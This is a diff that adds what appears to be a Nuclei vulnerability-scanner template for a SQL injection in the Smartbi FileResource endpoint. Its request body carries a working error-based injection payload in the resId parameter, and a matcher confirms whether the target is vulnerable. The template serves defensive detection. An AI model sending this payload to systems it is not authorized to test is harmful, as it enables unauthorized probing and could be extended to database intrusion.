@@ -1,0 +1,30 @@
+id: smartbi-fileresource-sqli
+info:
+  name: Smartbi FileResource SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The Smartbi FileResource endpoint is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL queries.
+
+variables:
+  r_random_str: "{{rand_text_alphanumeric(6)}}"
+  r_verify_md5: "{{substr(md5(r_random_str), 6, 28)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/smartbi/vision/FileResource"
+      - "{{BaseURL}}/vision/FileResource"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "op=OPEN&resId=LOGIN_BG_IMG%27%20AND%20extractvalue(1,concat(0,md5('{{r_random_str}}')))--%20"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{r_verify_md5}}"
+        part: body
